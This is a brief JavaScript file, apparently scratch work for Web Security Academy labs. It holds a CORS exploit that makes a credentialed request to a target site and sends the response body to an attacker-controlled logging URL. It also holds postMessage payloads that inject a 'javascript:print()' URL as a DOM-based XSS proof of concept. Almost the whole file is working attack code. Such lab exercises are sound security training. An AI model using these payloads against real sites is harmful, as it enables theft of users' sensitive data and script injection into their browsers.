var req = new XMLHttpRequest();

req.onload = reqListener;

req.open('get','https://public-website.com',true);

req.withCredentials = true;

req.send();

function reqListener() {

 	location='https://mywebsite.com/log?key='+this.responseText;

};


window.postMessage(JSON.stringify({type:"page-load",url:"https://0a52001104dc710c83b4e75400fe007d.web-security-academy.net/",width:100,height:100}));

window.postMessage(JSON.stringify({type:"load-channel",url:"javascript:print()"}));

JSON.stringify({type:'load-channel',url:'javascript:print()'})



